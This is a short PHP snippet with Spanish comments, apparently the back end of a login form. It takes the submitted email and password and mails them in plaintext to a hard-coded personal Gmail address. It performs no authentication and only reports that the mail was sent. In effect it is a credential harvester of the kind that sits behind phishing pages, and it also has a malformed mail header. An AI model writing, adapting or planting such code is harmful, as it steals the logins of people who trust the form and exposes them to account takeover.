if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Obtener datos del formulario
    $email = filter_var($_POST['email'], FILTER_SANITIZE_EMAIL);
    $password = filter_var($_POST['password'], FILTER_SANITIZE_STRING);
    
    // Validar correo electrónico
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        die("Correo electrónico no válido");
    }

    // Preparar el contenido del correo
    $to = 'ing.faiber.diaz@gmail.com';
    $subject = 'Datos de Inicio de Sesión';
    $message = "Correo electrónico: $email\nContraseña: $password";
    $headers = "From: no-reply@example.com\r\n";
    $headers .= "Reply-To: ing.faiber.diaz@gmail.com";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";

    // Enviar el correo
    if (mail($to, $subject, $message, $headers)) {
        echo "Correo enviado exitosamente";
    } else {
        echo "Error al enviar el correo";
    }
} else {
    echo "Método de solicitud no válido";
}
